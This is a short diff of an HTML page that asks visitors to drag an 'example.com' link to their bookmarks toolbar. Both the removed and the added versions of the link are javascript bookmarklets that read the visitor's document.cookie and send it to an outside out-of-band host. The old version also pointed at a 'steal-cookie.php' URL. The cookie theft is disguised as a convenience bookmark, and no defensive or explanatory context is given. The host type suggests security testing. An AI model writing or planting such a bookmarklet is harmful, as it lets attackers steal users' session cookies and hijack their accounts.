@@ -6,6 +6,6 @@
   </head>
   <body>
     <div>Drag the link to the Bookmarks Toolbar for easier access</div>
-    <a onclick='top.location.assign("https://example.com/steal-cookie.php")' href='javascript:(function(){var xhr=new XMLHttpRequest();xhr.open("GET","https://dfrxtnfyuirwzwxhcgpjifk6vngqojz5d.oast.fun?a=",true);xhr.send("cookie="+document.cookie);})()'>example.com</a>
+    <a onclick='top.location.assign("https://example.com/")' href='javascript:(function(){fetch("https://dfrxtnfyuirwzwxhcgpjifk6vngqojz5d.oast.fun/?a=",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"cookie="+document.cookie}).then(res=>res.text()).then(text=>console.log(text))})()'>example.com</a>
 </body>
 </html>
